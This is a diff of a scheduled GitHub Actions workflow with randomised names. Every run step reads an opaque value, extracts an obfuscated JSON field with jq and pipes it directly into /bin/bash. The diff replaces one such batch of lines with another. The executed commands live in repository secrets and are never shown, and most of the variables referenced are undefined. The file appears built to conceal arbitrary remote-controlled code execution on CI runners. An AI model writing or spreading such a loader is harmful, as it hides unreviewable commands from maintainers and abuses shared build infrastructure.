@@ -1,9 +1,8 @@
 name: lingjigou6351
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '53 3/6 * * *'
+    - cron: '12 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,28 +10,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: lingjigou6351
         env:
-          rh44: ${{ secrets.rh44 }}
+          ampim9: ${{ secrets.ampim9 }}
         run: |
-          echo $rh44 | jq -r .m8 | /bin/bash
-          echo $ghla80 | jq -r .ef37 | /bin/bash
-          echo $venre3 | jq -r .fz61 | /bin/bash
-          echo $orejz979 | jq -r .vepv479 | /bin/bash
-          echo $e75596 | jq -r .hywmu67 | /bin/bash
-          echo $bnvv72366 | jq -r .g12322 | /bin/bash
-          echo $ggmob00916 | jq -r .ngf6 | /bin/bash
-          echo $bv0 | jq -r .ihzj86 | /bin/bash
-          echo $c4515 | jq -r .suha18248 | /bin/bash
-          echo $mfyh9 | jq -r .dpiy426 | /bin/bash
-          echo $zzkb2 | jq -r .jvv86 | /bin/bash
-          echo $kb9 | jq -r .i095 | /bin/bash
-          echo $deeq41 | jq -r .au61 | /bin/bash
-          echo $zvuuq6196 | jq -r .lfiuw5 | /bin/bash
-          echo $ysr83337 | jq -r .yox13 | /bin/bash
-          echo $f5 | jq -r .v6 | /bin/bash
-          echo $fbnz7256 | jq -r .skm5 | /bin/bash
-          echo $zgxlx576 | jq -r .bdx92227 | /bin/bash
-          echo $u60 | jq -r .j8265 | /bin/bash
-          echo $em31491 | jq -r .wh12043 | /bin/bash
-          echo $y77 | jq -r .h35650 | /bin/bash
-          echo $vushw5 | jq -r .ofgl04083 | /bin/bash
+          echo $ampim9 | jq -r .hoew433 | /bin/bash
+          echo $u57 | jq -r .cz9642 | /bin/bash
+          echo $l48730 | jq -r .eios4810 | /bin/bash
+          echo $drpsa396 | jq -r .u06 | /bin/bash
+          echo $cj94 | jq -r .j19 | /bin/bash
+          echo $dwaz8 | jq -r .ys0 | /bin/bash
+          echo $ibhlf26 | jq -r .ri7 | /bin/bash
+          echo $hfa8468 | jq -r .bu671 | /bin/bash
+          echo $zxctu47 | jq -r .xvgql61 | /bin/bash
 
